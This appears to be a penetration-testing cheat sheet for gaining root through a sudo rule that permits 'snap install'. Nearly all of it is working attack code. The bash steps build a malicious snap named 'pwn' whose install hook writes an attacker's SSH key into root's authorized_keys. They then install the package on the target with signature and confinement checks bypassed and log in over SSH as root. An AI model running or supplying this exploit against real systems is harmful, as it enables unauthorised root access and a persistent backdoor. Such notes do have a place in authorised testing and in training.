# Snap Package sudo Privesc

When `sudo snap install *` (or `NOPASSWD: /usr/bin/snap install`) — craft a malicious snap.

**Build on attacker machine (Ubuntu):**
```bash
mkdir -p dirty_snap/snap/hooks
cat > dirty_snap/snap/hooks/install << 'HOOK'
#!/bin/bash
mkdir -p /root/.ssh
echo "<pub-key>" >> /root/.ssh/authorized_keys
HOOK
chmod +x dirty_snap/snap/hooks/install

cat > dirty_snap/snap/snapcraft.yaml << 'YAML'
name: pwn
version: '0.1'
summary: pwn
description: pwn
grade: devel
confinement: devmode
parts:
  my-part:
    plugin: nil
YAML

cd dirty_snap && snapcraft
```

**Transfer and install:**
```bash
# on target:
sudo snap install --devmode pwn_0.1_amd64.snap --dangerous
ssh root@<TARGET>   # if hook wrote SSH key
```

`--dangerous` bypasses signature check; `--devmode` bypasses confinement errors.
